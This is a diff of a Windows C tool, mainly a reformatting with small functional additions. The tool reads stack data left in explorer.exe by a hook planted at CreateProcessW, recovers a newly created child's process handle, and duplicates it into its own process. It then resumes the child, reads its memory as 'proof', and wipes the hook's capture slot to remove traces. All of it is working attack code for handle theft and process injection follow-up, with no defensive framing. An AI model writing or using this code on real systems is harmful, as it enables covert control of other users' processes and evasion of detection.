@@ -7,167 +7,169 @@
 
 #pragma comment(lib, "ntdll.lib")
 
-EXTERN_C NTSTATUS NTAPI NtResumeProcess(_In_ HANDLE hProcess);
+EXTERN_C NTSTATUS NTAPI NtResumeProcess(HANDLE process);
 
 // Source dependency: the kernel32!CreateProcessW wrapper stores the caller's
 // lpProcessInformation at [entry_rsp-0x10]; at the hook site (after SUB rsp,58h
 // and the internal CALL returns) that location is [RSP+0x48].
 #define STACK_PI_OFFSET 0x48
 
-static BOOL ReadRemote(
-    _In_ HANDLE hProcess,
-    _In_ UINT_PTR qwAddress,
-    _Out_writes_bytes_(cbSize) LPVOID lpBuffer,
-    _In_ SIZE_T cbSize
-) {
-    SIZE_T cbRead = 0;
-    if (!ReadProcessMemory(hProcess, (LPCVOID) qwAddress, lpBuffer, cbSize, &cbRead) || cbRead != cbSize) {
-        fprintf(stderr, "[-] ReadProcessMemory at 0x%llX: E%lu\n", (unsigned long long) qwAddress, GetLastError());
-        return FALSE;
-    }
-    return TRUE;
+static BOOL ReadRemote(HANDLE process, UINT_PTR address, LPVOID buffer, SIZE_T size)
+{
+	SIZE_T read = 0;
+	if (!ReadProcessMemory(process, (LPCVOID)address, buffer, size, &read) || read != size)
+	{
+		fprintf(stderr, "[-] ReadProcessMemory at 0x%llX: E%lu\n", (unsigned long long)address, GetLastError());
+		return FALSE;
+	}
+	return TRUE;
 }
 
-int main(int argc, const char* argv[]) {
-    if (argc < 3) {
-        fprintf(stderr, "Usage: %s <EXPLORER_PID> <RSP_SLOT_ADDRESS_HEX>\n", argv[0]);
-        return EXIT_FAILURE;
-    }
+int main(int argc, const char* argv[])
+{
+	if (argc < 3)
+	{
+		fprintf(stderr, "Usage: %s <EXPLORER_PID> <RSP_SLOT_ADDRESS_HEX>\n", argv[0]);
+		return EXIT_FAILURE;
+	}
 
-    DWORD dwPid = (DWORD) strtoul(argv[1], NULL, 10);
-    UINT_PTR qwSlot = (UINT_PTR) strtoull(argv[2], NULL, 16);
-    if (0 == dwPid || 0 == qwSlot) {
-        fprintf(stderr, "[-] Invalid PID or slot address\n");
-        return EXIT_FAILURE;
-    }
+	DWORD pid = (DWORD)strtoul(argv[1], NULL, 10);
+	UINT_PTR slot = (UINT_PTR)strtoull(argv[2], NULL, 16);
+	if (!pid || !slot)
+	{
+		fprintf(stderr, "[-] Invalid PID or slot address\n");
+		return EXIT_FAILURE;
+	}
 
-    INT iRet = EXIT_FAILURE;
-    HANDLE hExplorer = OpenProcess(
-        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE,
-        FALSE,
-        dwPid
-    );
-    if (NULL == hExplorer) {
-        fprintf(stderr, "[-] OpenProcess(%lu): E%lu\n", dwPid, GetLastError());
-        return EXIT_FAILURE;
-    }
+	INT result = EXIT_FAILURE;
+	HANDLE explorer = OpenProcess(
+		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION |
+		PROCESS_VM_WRITE | PROCESS_DUP_HANDLE,
+		FALSE,
+		pid);
+	if (!explorer)
+	{
+		fprintf(stderr, "[-] OpenProcess(%lu): E%lu\n", pid, GetLastError());
+		return EXIT_FAILURE;
+	}
 
-    HANDLE hDup = NULL;
-    UINT_PTR qwRsp = 0;
-    UINT_PTR qwPiPtr = 0;
-    PROCESS_INFORMATION pi = { 0 };
+	HANDLE dup = NULL;
+	UINT_PTR rsp = 0;
+	UINT_PTR piPtr = 0;
+	PROCESS_INFORMATION pi = { 0 };
 
-    if (!ReadRemote(hExplorer, qwSlot, &qwRsp, sizeof(qwRsp))) {
-        goto _FINAL;
-    }
-    if (0 == qwRsp || 0xCCCCCCCCCCCCCCCCULL == qwRsp) {
-        fprintf(stderr, "[-] RSP slot is empty or still INT3 padding; the hook has not fired\n");
-        goto _FINAL;
-    }
+	if (!ReadRemote(explorer, slot, &rsp, sizeof(rsp)))
+		goto _FINAL;
+	if (!rsp || rsp == 0xCCCCCCCCCCCCCCCCULL)
+	{
+		fprintf(stderr, "[-] RSP slot is empty or still INT3 padding; the hook has not fired\n");
+		goto _FINAL;
+	}
 
-    if (!ReadRemote(hExplorer, qwRsp + STACK_PI_OFFSET, &qwPiPtr, sizeof(qwPiPtr))) {
-        goto _FINAL;
-    }
-    if (0 == qwPiPtr) {
-        fprintf(stderr, "[-] Stack slot [RSP+0x48] is null; no PROCESS_INFORMATION pointer\n");
-        goto _FINAL;
-    }
+	if (!ReadRemote(explorer, rsp + STACK_PI_OFFSET, &piPtr, sizeof(piPtr)))
+		goto _FINAL;
+	if (!piPtr)
+	{
+		fprintf(stderr, "[-] Stack slot [RSP+0x48] is null; no PROCESS_INFORMATION pointer\n");
+		goto _FINAL;
+	}
 
-    if (!ReadRemote(hExplorer, qwPiPtr, &pi, sizeof(pi))) {
-        goto _FINAL;
-    }
+	if (!ReadRemote(explorer, piPtr, &pi, sizeof(pi)))
+		goto _FINAL;
 
-    printf(
-        "[+] RSP slot................................. 0x%llX\n"
-        "[+] Captured RSP............................. 0x%llX\n"
-        "[+] PROCESS_INFORMATION pointer.............. 0x%llX (at RSP+0x48)\n"
-        "[+] PROCESS_INFORMATION address.............. 0x%llX\n"
-        "[+] hProcess / hThread....................... 0x%llX / 0x%llX\n"
-        "[+] dwProcessId / dwThreadId................. %lu / %lu\n",
-        (unsigned long long) qwSlot,
-        (unsigned long long) qwRsp,
-        (unsigned long long) (qwRsp + STACK_PI_OFFSET),
-        (unsigned long long) qwPiPtr,
-        (unsigned long long) pi.hProcess,
-        (unsigned long long) pi.hThread,
-        pi.dwProcessId,
-        pi.dwThreadId
-    );
+	printf(
+		"[+] RSP slot................................. 0x%llX\n"
+		"[+] Captured RSP............................. 0x%llX\n"
+		"[+] PROCESS_INFORMATION pointer.............. 0x%llX (at RSP+0x48)\n"
+		"[+] PROCESS_INFORMATION address.............. 0x%llX\n"
+		"[+] hProcess / hThread....................... 0x%llX / 0x%llX\n"
+		"[+] dwProcessId / dwThreadId................. %lu / %lu\n",
+		(unsigned long long)slot,
+		(unsigned long long)rsp,
+		(unsigned long long)(rsp + STACK_PI_OFFSET),
+		(unsigned long long)piPtr,
+		(unsigned long long)pi.hProcess,
+		(unsigned long long)pi.hThread,
+		pi.dwProcessId,
+		pi.dwThreadId);
 
-    if (0 == pi.dwProcessId || NULL == pi.hProcess) {
-        fprintf(stderr, "[-] Recovered PROCESS_INFORMATION is not plausible\n");
-        goto _FINAL;
-    }
+	if (!pi.dwProcessId || !pi.hProcess)
+	{
+		fprintf(stderr, "[-] Recovered PROCESS_INFORMATION is not plausible\n");
+		goto _FINAL;
+	}
 
-    if (!DuplicateHandle(
-        hExplorer,
-        pi.hProcess,
-        GetCurrentProcess(),
-        &hDup,
-        PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME,
-        FALSE,
-        0
-    )) {
-        fprintf(stderr, "[-] DuplicateHandle: E%lu\n", GetLastError());
-        goto _FINAL;
-    }
+	if (!DuplicateHandle(
+		explorer,
+		pi.hProcess,
+		GetCurrentProcess(),
+		&dup,
+		PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME,
+		FALSE,
+		0))
+	{
+		fprintf(stderr, "[-] DuplicateHandle: E%lu\n", GetLastError());
+		goto _FINAL;
+	}
 
-    DWORD dwDupPid = GetProcessId(hDup);
-    if (dwDupPid != pi.dwProcessId) {
-        fprintf(
-            stderr,
-            "[-] Duplicated handle points at PID %lu, expected %lu\n",
-            dwDupPid,
-            pi.dwProcessId
-        );
-        goto _FINAL;
-    }
-    printf("[+] Duplicated handle validated: PID %lu matches the recovered structure\n", dwDupPid);
+	DWORD dupPid = GetProcessId(dup);
+	if (dupPid != pi.dwProcessId)
+	{
+		fprintf(stderr, "[-] Duplicated handle points at PID %lu, expected %lu\n", dupPid, pi.dwProcessId);
+		goto _FINAL;
+	}
+	printf("[+] Duplicated handle validated: PID %lu matches the recovered structure\n", dupPid);
 
-    NTSTATUS ntStatus = NtResumeProcess(hDup);
-    printf("[+] NtResumeProcess(child): 0x%08lX\n", (unsigned long) ntStatus);
+	NTSTATUS status = NtResumeProcess(dup);
+	printf("[+] NtResumeProcess(child): 0x%08lX\n", (unsigned long)status);
+	if (!NT_SUCCESS(status))
+	{
+		fprintf(stderr, "[-] Unable to resume the child process\n");
+		goto _FINAL;
+	}
 
-    HMODULE hChildModule = NULL;
-    DWORD cbNeeded = 0;
-    if (!K32EnumProcessModules(hDup, &hChildModule, sizeof(hChildModule), &cbNeeded) || 0 == cbNeeded) {
-        fprintf(stderr, "[-] K32EnumProcessModules(child): E%lu\n", GetLastError());
-        goto _FINAL;
-    }
+	HMODULE childModule = NULL;
+	DWORD needed = 0;
+	if (!K32EnumProcessModules(dup, &childModule, sizeof(childModule), &needed) || !needed)
+	{
+		fprintf(stderr, "[-] K32EnumProcessModules(child): E%lu\n", GetLastError());
+		goto _FINAL;
+	}
 
-    BYTE abHeader[2] = { 0 };
-    if (!ReadRemote(hDup, (UINT_PTR) hChildModule, abHeader, sizeof(abHeader))) {
-        goto _FINAL;
-    }
-    if ('M' != abHeader[0] || 'Z' != abHeader[1]) {
-        fprintf(stderr, "[-] Child image base does not start with MZ\n");
-        goto _FINAL;
-    }
-    printf(
-        "[+] Read proof: 2 bytes at child image base 0x%llX = %02X %02X (MZ)\n",
-        (unsigned long long) hChildModule,
-        abHeader[0],
-        abHeader[1]
-    );
+	BYTE header[2] = { 0 };
+	if (!ReadRemote(dup, (UINT_PTR)childModule, header, sizeof(header)))
+		goto _FINAL;
+	if (header[0] != 'M' || header[1] != 'Z')
+	{
+		fprintf(stderr, "[-] Child image base does not start with MZ\n");
+		goto _FINAL;
+	}
+	printf(
+		"[+] Read proof: 2 bytes at child image base 0x%llX = %02X %02X (MZ)\n",
+		(unsigned long long)childModule,
+		header[0],
+		header[1]);
 
-    CONST BYTE abZero[8] = { 0 };
-    SIZE_T cbWritten = 0;
-    if (!WriteProcessMemory(hExplorer, (LPVOID) qwSlot, abZero, sizeof(abZero), &cbWritten) || cbWritten != sizeof(abZero)) {
-        fprintf(stderr, "[-] RSP slot cleanup write: E%lu\n", GetLastError());
-        goto _FINAL;
-    }
-    UINT_PTR qwCleared = 0;
-    if (!ReadRemote(hExplorer, qwSlot, &qwCleared, sizeof(qwCleared)) || 0 != qwCleared) {
-        fprintf(stderr, "[-] RSP slot cleanup verification failed\n");
-        goto _FINAL;
-    }
-    printf("[+] RSP slot cleared and verified\n");
+	const BYTE zero[8] = { 0 };
+	SIZE_T written = 0;
+	if (!WriteProcessMemory(explorer, (LPVOID)slot, zero, sizeof(zero), &written) || written != sizeof(zero))
+	{
+		fprintf(stderr, "[-] RSP slot cleanup write: E%lu\n", GetLastError());
+		goto _FINAL;
+	}
+	UINT_PTR cleared = 0;
+	if (!ReadRemote(explorer, slot, &cleared, sizeof(cleared)) || cleared)
+	{
+		fprintf(stderr, "[-] RSP slot cleanup verification failed\n");
+		goto _FINAL;
+	}
+	printf("[+] RSP slot cleared and verified\n");
 
-    iRet = EXIT_SUCCESS;
+	result = EXIT_SUCCESS;
 
 _FINAL:
-    if (NULL != hDup) {
-        CloseHandle(hDup);
-    }
-    CloseHandle(hExplorer);
-    return iRet;
+	if (dup)
+		CloseHandle(dup);
+	CloseHandle(explorer);
+	return result;
 }
